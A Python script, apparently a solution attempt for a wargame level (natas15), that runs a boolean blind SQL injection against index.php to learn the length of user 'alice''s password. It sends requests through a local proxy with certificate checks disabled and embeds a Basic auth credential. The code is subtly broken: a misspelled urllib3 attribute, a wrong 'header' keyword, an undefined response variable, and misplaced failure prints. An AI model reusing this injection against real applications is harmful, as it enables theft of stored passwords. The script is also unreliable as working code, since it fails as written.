import requests
import urllib3
import sys

urllib3.disable_warnings(urllib3.exception.sInsecureRequestWarning)

proxies = {'http' : 'http://127.0.0.1:8080', 'https' : 'http://127.0.0.1:8080'}

def find_psw_length(username, url, auth):
    for i in range(0, 100):
        index_url = url + '/index.php?username='
        payload = index_url+'{0}"+AND+(SELECT+username+FROM+users+WHERE+username%3d"alice"+and+LENGTH(password)={1})%3d"alice"--+&debug=true'.format(username, i)
        requests.get(payload, header=auth, proxies=proxies, verify=False)
        if "This user exists." in r.text:
            print("[+] Password length is %i" % i)
            return i
        else:
            print("[-] Could not determine the password length")

def main():
    if len(sys.argv) != 2:
        print("[-] Usage: %s url" % sys.argv[0])

    url = sys.argv[1].strip()

    # Authorization header
    auth = {
        'Authorization' : 'Basic bmF0YXMxNTpUVGthSTdBV0c0aURFUnp0QmNFeUtWN2tSWEgxRVpSQg=='
    }

    username = 'alice'
    print("[+] Let's find out the password length")
    password_length = find_psw_length(username, url, auth)


if __name__ == "__main__":
    main()